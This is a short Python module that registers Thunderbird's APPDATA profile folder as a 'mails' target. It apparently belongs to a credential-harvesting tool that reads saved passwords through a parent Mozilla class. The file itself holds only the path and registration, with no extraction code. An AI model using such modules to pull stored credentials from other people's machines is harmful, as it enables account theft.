from r8547T.base.module_info import ModuleInfo
from r8547T.sof.browsers.mozilla import Mozilla


class Thunderbird(Mozilla):

    def __init__(self):
        self.path = u'{APPDATA}\\Thunderbird'
        ModuleInfo.__init__(self, 'Thunderbird', 'mails')
